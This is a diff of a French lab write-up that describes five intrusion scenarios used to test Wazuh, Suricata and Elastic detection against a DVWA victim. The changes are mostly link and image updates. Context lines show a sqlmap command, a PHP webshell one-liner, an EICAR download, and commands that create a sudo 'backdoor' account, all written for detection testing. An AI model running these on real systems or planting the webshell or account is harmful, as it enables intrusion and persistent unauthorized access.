@@ -1,4 +1,4 @@
-# Partie 2.2 — Les cinq scénarios d'intrusion
+# Les cinq scénarios d'intrusion
 
 Chaque scénario est décrit selon la même trame : objectif de l'attaquant, justification du choix, attaque rejouable, logs concernés, détection attendue puis obtenue.
 
@@ -27,7 +27,7 @@ Règle commune : **Kali attaque toujours l'adresse lab de la victime, `10.10.10.
 
 ## Scénario 1 — Brute-force SSH ✅
 
-> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 1 — brute-force SSH](../3-attaques/01-brute-force-ssh.md).
+> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 1 — brute-force SSH](01-brute-force-ssh.md).
 
 **Objectif de l'attaquant.** Deviner le mot de passe d'un compte en essayant automatiquement une liste de mots de passe.
 
@@ -59,13 +59,14 @@ Les deux règles Wazuh se déclenchent par deux chemins différents. C'est la pr
 - vérifier qu'aucune connexion n'a réussi (`Accepted password` dans `auth.log`) ;
 - imposer l'authentification par clé.
 
-> 📸 `img/s1-wazuh-alertes.png` : alertes 5763 dans Threat Hunting · `img/s1-elk-alerte.png` : alerte dans Elastic Security
+![Threat Hunting Wazuh : échecs d'authentification SSH de l'agent victime (règles 5763/2502)](img/01-brute-force-ssh/wazuh-threat-hunting.png)
+![Alertes de brute-force SSH concentrées sur la victime dans Elastic Security](img/01-brute-force-ssh/elastic-alerts.png)
 
 ---
 
 ## Scénario 2 — Attaque web (injection SQL, LFI) ✅
 
-> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 2 — attaque web](../3-attaques/02-attaque-web.md).
+> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 2 — attaque web](02-attaque-web.md).
 
 **Objectif de l'attaquant.** Exploiter une faille de l'application web pour lire la base de données (injection SQL) ou des fichiers du serveur (inclusion de fichier local).
 
@@ -98,13 +99,14 @@ sqlmap -u "http://10.10.10.10/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie
 
 **Menace représentée.** Vol de la base de données (comptes, mots de passe), lecture de fichiers système, puis exécution de code.
 
-> 📸 `img/s2-wazuh.png` · `img/s2-elk.png`
+![Événements Wazuh de l'attaque web sur l'agent victime (alertes Suricata)](img/02-attaque-web/event-list-wazuh.png)
+![Alerte « Lab - Tentative d'attaque web » dans Elastic Security](img/02-attaque-web/dashboard-elastic.png)
 
 ---
 
 ## Scénario 3 — Scan de ports ✅
 
-> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 3 — scan de ports](../3-attaques/03-scan-de-ports.md).
+> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 3 — scan de ports](03-scan-de-ports.md).
 
 **Objectif de l'attaquant.** Cartographier les services ouverts de la victime avant de choisir une cible.
 
@@ -139,13 +141,14 @@ La signature est déclarée dans `rule-files` de `/etc/suricata/suricata.yaml` (
 
 **Menace représentée.** Phase de reconnaissance. Seule, elle ne cause aucun dommage, mais elle annonce une attaque ciblée.
 
-> 📸 `img/s3-wazuh.png`
+![Alerte Suricata de scan de ports dans Wazuh (signature sid:1000001)](img/03-scan-de-ports/wazuh-threat-hunting.png)
+![Alerte de seuil « Lab - Scan de ports » dans Elastic Security](img/03-scan-de-ports/elastic-alerts-threshold.png)
 
 ---
 
 ## Scénario 4 — Modification de fichiers sensibles ✅
 
-> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 4 — modification de fichiers](../3-attaques/04-modification-fichiers.md).
+> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 4 — modification de fichiers](04-modification-fichiers.md).
 
 **Objectif de l'attaquant.** Une fois sur la machine, s'y maintenir : créer une porte dérobée (webshell) ou altérer les fichiers de comptes.
 
@@ -162,7 +165,7 @@ echo '<?php system($_GET["cmd"]); ?>' > /var/www/dvwa/shell.php
 
 Penser à retirer la ligne ajoutée et le fichier après le test.
 
-**Prérequis.** Surveillance temps réel activée sur `/etc` et `/var/www/dvwa` (voir [déploiement](01-deploiement.md#intégrité-des-fichiers-scénario-4)).
+**Prérequis.** Surveillance temps réel activée sur `/etc` et `/var/www/dvwa` (voir [déploiement](../2-wazuh/01-deploiement.md#intégrité-des-fichiers-scénario-4)).
 
 **Détection attendue :**
 
@@ -173,13 +176,13 @@ Penser à retirer la ligne ajoutée et le fichier après le test.
 
 **Menace représentée.** Un compte d'UID 0 donne un accès root permanent ; un webshell permet d'exécuter des commandes à distance par simple requête HTTP.
 
-> 📸 `img/s4-wazuh-fim.png`
+![Alertes FIM de Wazuh : /etc/passwd modifié (550) et webshell ajouté (554)](img/04-modification-fichiers/wazuh-fim-alerts.png)
 
 ---
 
 ## Scénario 5 — Malware et élévation de privilèges ✅
 
-> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 5 — malware et élévation de privilèges](../3-attaques/05-malware-privileges.md).
+> Mode opératoire pas à pas (commandes, vérifications, preuves) : [attaque 5 — malware et élévation de privilèges](05-malware-privileges.md).
 
 **Objectif de l'attaquant.** Déposer un outil malveillant, puis se créer un compte privilégié.
 
@@ -194,7 +197,7 @@ curl -s -o /var/www/dvwa/eicar.com https://secure.eicar.org/eicar.com
 useradd -m backdoor && usermod -aG sudo backdoor
 ```
 
-**Prérequis.** Intégration VirusTotal configurée sur le manager (voir [déploiement](01-deploiement.md#notifications)).
+**Prérequis.** Intégration VirusTotal configurée sur le manager (voir [déploiement](../2-wazuh/01-deploiement.md#notifications)).
 
 **Détection attendue :**
 
@@ -205,4 +208,5 @@ useradd -m backdoor && usermod -aG sudo backdoor
 
 **Menace représentée.** Exécution de code malveillant et maintien d'un accès administrateur.
 
-> 📸 `img/s5-wazuh-virustotal.png` · `img/s5-wazuh-useradd.png`
+![Détection VirusTotal du fichier EICAR dans Wazuh (règle 87105)](img/05-malware-privileges/alert-virus-total.png)
+![Création du compte backdoor et ajout au groupe sudo détectés par Wazuh](img/05-malware-privileges/wazuh-add-user-alert.png)
